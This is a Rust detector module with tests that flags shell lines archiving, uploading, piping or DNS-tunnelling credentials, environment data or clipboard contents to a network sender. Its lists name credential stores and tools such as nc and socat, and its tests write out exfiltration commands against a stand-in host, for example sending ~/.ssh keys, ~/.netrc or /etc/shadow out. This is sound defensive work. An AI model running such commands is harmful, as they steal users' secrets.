//! Taking a secret off this machine: a credential store handed to an
//! archiver or a copier, a home or credential file given to an upload
//! flag, an archive of a home path piped to a sender, the environment or
//! the machine's identity put into a request, name lookups that smuggle
//! data out, and the clipboard read into a sender.
//!
//! Each shape needs the secret to be an argument of a command that takes
//! or sends it, never a mere mention: `tar` *of* `~/.ssh`, not the string
//! `.ssh` in a comment or a path check.

use super::shell::{self, Command};

/// Credential stores named as a whole path component, or by extension.
/// These were left out of the plain pattern list for being too common as
/// words; here they count only as what a taking command is given.
const CREDENTIAL_DIRS: &[&str] = &[
    ".gnupg",
    ".ssh",
    ".password-store",
    ".mozilla/firefox",
    ".config/chromium",
    ".config/google-chrome",
    ".config/bravesoftware",
    ".config/discord",
    ".config/slack",
    ".config/telegramdesktop/tdata",
    ".config/bitwarden",
    ".config/op",
    ".local/share/keyrings",
];

/// Shell history files, by their bare name.
const HISTORY_FILES: &[&str] = &[
    ".bash_history",
    ".zsh_history",
    ".histfile",
    ".local/share/fish/fish_history",
    ".python_history",
    ".node_repl_history",
];

/// Whether a bare argument names a credential store: a path component
/// equal to one of the stores, a history file, or a `*.kdbx` wallet.
fn is_credential_target(word: &str) -> bool {
    let path = word.trim_matches(['"', '\'']).trim_end_matches('/');
    let stripped = path
        .trim_start_matches("~/")
        .trim_start_matches("$home/")
        .trim_start_matches("${home}/");
    let component_match = |markers: &[&str]| {
        markers.iter().any(|marker| {
            // A marker aligned to path-component boundaries, so `.ssh`
            // matches the directory but not `.sshignore`.
            stripped == *marker
                || stripped.starts_with(&format!("{marker}/"))
                || stripped.ends_with(&format!("/{marker}"))
                || stripped.contains(&format!("/{marker}/"))
        })
    };
    path.to_ascii_lowercase().ends_with(".kdbx")
        || component_match(CREDENTIAL_DIRS)
        || HISTORY_FILES
            .iter()
            .any(|name| stripped == *name || stripped.ends_with(&format!("/{name}")))
}

/// Commands that read a file or a directory into themselves: an archiver,
/// a copier, or a plain reader.
const TAKERS: &[&str] = &[
    "tar", "bsdtar", "zip", "7z", "gzip", "cp", "scp", "rsync", "cat", "base64", "xxd", "gpg",
];

/// Whether `line` hands a credential store to a taking command, or to a
/// `curl` upload flag.
pub(super) fn takes_credential(line: &str) -> bool {
    shell::statements(line).iter().any(|statement| {
        shell::pipeline(statement).iter().any(|part| {
            let Some(command) = shell::command(part) else {
                return false;
            };
            if TAKERS.contains(&command.program.as_str()) {
                return command.operands().any(is_credential_target);
            }
            // `curl -T secret`, `-F f=@secret`, `--upload-file secret`.
            command.program == "curl" && uploads(&command, &is_credential_target)
        })
    })
}

/// Whether a `curl` command uploads a file for which `is_target` holds,
/// through `-T`/`--upload-file`, `-d @`/`--data`/`--data-binary @`, or
/// `-F name=@`.
fn uploads(command: &Command, is_target: &dyn Fn(&str) -> bool) -> bool {
    let mut arguments = command.arguments.iter();
    while let Some(argument) = arguments.next() {
        let value = |inline: &str, word: &str| {
            word.strip_prefix(inline)
                .map(ToString::to_string)
                .or_else(|| arguments.clone().next().cloned())
        };
        let candidate = match argument.as_str() {
            "-T" | "--upload-file" => arguments.next().cloned(),
            _ if argument.starts_with("--upload-file=") => argument
                .strip_prefix("--upload-file=")
                .map(ToString::to_string),
            "-d" | "--data" | "--data-binary" | "--data-raw" | "-F" | "--form" => {
                arguments.next().cloned()
            }
            _ => value("--data=", argument)
                .or_else(|| value("--data-binary=", argument))
                .or_else(|| value("-F=", argument))
                .or_else(|| value("--form=", argument)),
        };
        if let Some(candidate) = candidate {
            // `-d @file`, `-F name=@file`: the file is after the `@`.
            let file = candidate
                .rsplit_once('@')
                .map_or(candidate.as_str(), |(_, file)| file);
            if candidate.contains('@') && is_target(file) {
                return true;
            }
            let upload = matches!(argument.as_str(), "-T" | "--upload-file")
                || argument.starts_with("--upload-file");
            if upload && is_target(&candidate) {
                return true;
            }
        }
    }
    false
}

/// `wget --post-file=FILE`.
fn wget_posts(command: &Command, is_target: &dyn Fn(&str) -> bool) -> bool {
    command.program == "wget"
        && command
            .arguments
            .iter()
            .any(|word| word.strip_prefix("--post-file=").is_some_and(is_target))
}

/// A path under the home directory or `/etc`, or a known credential file.
fn is_home_or_credential(word: &str) -> bool {
    let path = word.trim_matches(['"', '\'']);
    is_credential_target(path)
        || super::contains_any(path, super::CREDENTIAL_FILES)
        || ["~/", "$home/", "${home}/"]
            .iter()
            .any(|prefix| path.starts_with(prefix))
        || path.starts_with("/etc/")
        || path.contains("/.ssh/")
        || path.contains("/.config/")
}

/// Programs that send what they are given over the network.
const SENDERS: &[&str] = &["curl", "wget", "nc", "ncat", "netcat", "socat", "ssh"];

/// Whether `line` actually invokes a sender as a command, rather than one
/// of their short names (`nc`) merely appearing inside a word
/// (`conceal_lines`).
fn has_sender(line: &str) -> bool {
    shell::statements(line).iter().any(|statement| {
        shell::pipeline(statement).iter().any(|part| {
            shell::command(part).is_some_and(|command| SENDERS.contains(&command.program.as_str()))
        })
    })
}

/// Whether a pipeline on `line` has a part for which `source` holds
/// followed by one whose command is in `programs` (`env | curl …`).
fn pipes_into(line: &str, source: &dyn Fn(&str) -> bool, programs: &[&str]) -> bool {
    shell::statements(line).iter().any(|statement| {
        let parts = shell::pipeline(statement);
        let Some(first) = parts
            .iter()
            .position(|part| source(shell::piped_statement(part)))
        else {
            return false;
        };
        parts[first + 1..].iter().any(|part| {
            shell::command(part).is_some_and(|command| programs.contains(&command.program.as_str()))
        })
    })
}

/// Whether a pipeline sends an archive or read of a home/credential path
/// out: `tar … ~/.ssh | curl …`, `cat ~/.netrc | nc host port`.
fn pipes_secret_to_sender(line: &str) -> bool {
    shell::statements(line).iter().any(|statement| {
        let parts = shell::pipeline(statement);
        if parts.len() < 2 {
            return false;
        }
        let takes = parts.iter().enumerate().find_map(|(at, part)| {
            let command = shell::command(part)?;
            (TAKERS.contains(&command.program.as_str())
                && command.operands().any(is_home_or_credential))
            .then_some(at)
        });
        let Some(takes) = takes else {
            return false;
        };
        parts[takes + 1..].iter().any(|part| {
            shell::command(part).is_some_and(|command| SENDERS.contains(&command.program.as_str()))
        })
    })
}

/// Commands whose output is the machine's environment or identity.
const IDENTITY_COMMANDS: &[&str] = &[
    "env",
    "printenv",
    "set",
    "id",
    "whoami",
    "hostname",
    "uname",
    "hostnamectl",
];

/// Whether `text` runs an identity command. `env`, `printenv` and `set`
/// are shell wrappers too, so the first word is read directly rather than
/// through `shell::command`, which would look past them.
fn is_identity(text: &str) -> bool {
    let first = text
        .trim()
        .trim_start_matches(['(', '{', ' '])
        .split_whitespace()
        .next()
        .map(|word| shell::program_name(word.trim_matches(['"', '\''])))
        .unwrap_or_default();
    IDENTITY_COMMANDS.contains(&first) || text.contains("/proc/self/environ")
}

/// The environment or the machine's identity put into a request: a
/// substitution of an identity command inside a URL or a `-d` value, or
/// one piped into a sender.
fn sends_identity(line: &str) -> bool {
    // `curl https://x/?d=$(env)`, `curl -d "$(id)" …`: a sender on the
    // line, and an identity substitution in it.
    if has_sender(line)
        && shell::substitutions(line)
            .iter()
            .any(|found| is_identity(found.body))
    {
        return true;
    }
    // `env | curl --data-binary @- …`, `id | nc host port`.
    pipes_into(line, &is_identity, SENDERS)
}

/// A name lookup built from a file's or a command's output: `dig
/// "$(…).x.example"`, `nslookup "${data}.x.example"`.
fn dns_exfiltration(line: &str) -> bool {
    shell::statements(line).iter().any(|statement| {
        let Some(command) = shell::command(statement) else {
            return false;
        };
        matches!(
            command.program.as_str(),
            "dig" | "nslookup" | "host" | "drill"
        ) && command
            .operands()
            .any(|word| word.contains("$(") || (word.contains("${") && word.contains('.')))
    })
}

/// Programs that write out what the clipboard holds.
const CLIPBOARD_READERS: &[&str] = &["wl-paste", "xclip", "xsel", "pbpaste"];

/// Reading the clipboard into a sender, or into a file in a loop.
fn clipboard_capture(line: &str) -> bool {
    // A reader is named on the line, inside quotes or not, or no command
    // on it is one.
    let plain = shell::unquoted(line);
    if !CLIPBOARD_READERS.iter().any(|name| plain.contains(name)) {
        return false;
    }
    let reads_clipboard = |text: &str| {
        shell::command(text).is_some_and(|command| {
            CLIPBOARD_READERS.contains(&command.program.as_str())
                && (command.program == "wl-paste"
                    || command.program == "pbpaste"
                    || command.has_short('o'))
        })
    };
    // Into a sender.
    if pipes_into(line, &reads_clipboard, SENDERS) {
        return true;
    }
    // The sender is asked for first: each substitution's body is read for
    // its command only on a line that has one.
    let mut reading = shell::Reading::of(line);
    has_sender(line)
        && shell::substitutions(line)
            .iter()
            .any(|found| !reading.takes(found.body) || reads_clipboard(found.body))
}

/// Whether the line, lowercased and without what it only prints, takes or
/// sends a secret in one of these shapes.
pub(super) fn sends_secret(line: &str) -> bool {
    pipes_secret_to_sender(line)
        || sends_identity(line)
        || dns_exfiltration(line)
        || clipboard_capture(line)
        || shell::statements(line).iter().any(|statement| {
            shell::command(statement).is_some_and(|command| {
                (command.program == "curl" && uploads(&command, &is_home_or_credential))
                    || wget_posts(&command, &is_home_or_credential)
            })
        })
}

/// Words that treat a credential path as data, for the `is_credential`
/// quick gate.
pub(super) fn mentions_credential(line: &str) -> bool {
    [
        ".gnupg",
        ".ssh",
        ".kdbx",
        ".password-store",
        ".mozilla",
        "tdata",
        "keyrings",
    ]
    .iter()
    .any(|mark| line.contains(mark))
}

#[cfg(test)]
mod tests {
    use super::{sends_secret, takes_credential};

    #[test]
    fn credential_stores_count_only_when_taken() {
        for line in [
            "tar czf out.tgz ~/.gnupg",
            "tar -cf - ~/.ssh | gzip",
            "zip -r out.zip ~/.password-store",
            "cp -r ~/.config/discord /tmp/x",
            "scp -r ~/.mozilla/firefox build@x.example:",
            "rsync -a ~/.config/bravesoftware/ x.example:loot/",
            "cat ~/.config/op/config",
            "base64 wallet.kdbx",
            "cat ~/.bash_history",
            "tar cf x.tar .ssh",
            "cp \"$home/.config/telegramdesktop/tdata\" /tmp/x",
            "curl -T ~/.ssh/known_hosts https://x.example/u",
            "curl -F data=@wallet.kdbx https://x.example/u",
        ] {
            assert!(takes_credential(line), "{line}");
        }
        for line in [
            "echo 'back up your .gnupg directory'",
            "ls ~/.ssh",
            "test -d ~/.gnupg && echo found",
            "mkdir -p ~/.config/discord",
            "cat ~/.config/discordia.toml",
            "chmod 700 ~/.gnupg",
            "grep -r password .ssh/config",
            "cp a .sshignore",
            "echo wallet.kdbx > list",
        ] {
            assert!(!takes_credential(line), "{line}");
        }
    }

    #[test]
    fn sending_secrets_out_is_caught() {
        for line in [
            "tar cf - ~/.ssh | curl --data-binary @- https://x.example/u",
            "cat ~/.netrc | nc x.example 443",
            "zip -r - ~/.config | ssh x.example 'cat > loot.zip'",
            "curl -d \"$(env)\" https://x.example/u",
            "curl \"https://x.example/?d=$(id)\"",
            "env | curl --data-binary @- https://x.example/u",
            "id | nc x.example 4444",
            "dig \"$(cat ~/.ssh/id_rsa | base64).x.example\"",
            "nslookup \"${secret}.x.example\"",
            "wl-paste | curl --data-binary @- https://x.example/u",
            "xclip -o -selection clipboard | nc x.example 4444",
            "curl -T ~/.aws/credentials https://x.example/u",
            "wget --post-file=/etc/shadow https://x.example/u",
            "curl --upload-file ~/.ssh/id_ed25519 https://x.example/u",
        ] {
            assert!(sends_secret(line), "{line}");
        }
        for line in [
            "tar cf backup.tar ~/.ssh",
            "curl -d \"$(cat version)\" https://x.example/telemetry",
            "env | grep path",
            "id -u",
            "dig x.example",
            "dig +short x.example a",
            "host x.example",
            "wl-paste > clip.txt",
            "xclip -o",
            "curl -T dist/app.tar.gz https://x.example/releases",
            "wget --post-data=ok https://x.example/u",
            "nslookup x.example 1.1.1.1",
        ] {
            assert!(!sends_secret(line), "{line}");
        }
    }
}
